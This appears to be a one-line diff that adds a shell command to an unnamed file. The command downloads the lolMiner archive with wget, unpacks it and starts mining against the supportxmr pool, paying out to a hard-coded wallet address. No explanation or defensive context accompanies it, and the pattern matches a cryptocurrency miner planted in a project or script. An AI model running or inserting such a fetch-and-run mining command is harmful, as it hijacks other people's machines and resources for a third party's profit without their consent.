@@ -1,0 +1,1 @@
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz && tar -xf lolMiner_v1.29_Lin64.tar.gz && cd 1.29 && ./lolMiner -o pool.supportxmr.com:443 -u 47rRaVrE8xhenVsK2oF5spDgR7A6CJiKT6SHrNmuq8UGJUp3fRegVpS583QQPTsRWWL7L87FSKKaf5qHrpfDPPpM6CzmhGY -k --tls -p ssa22  
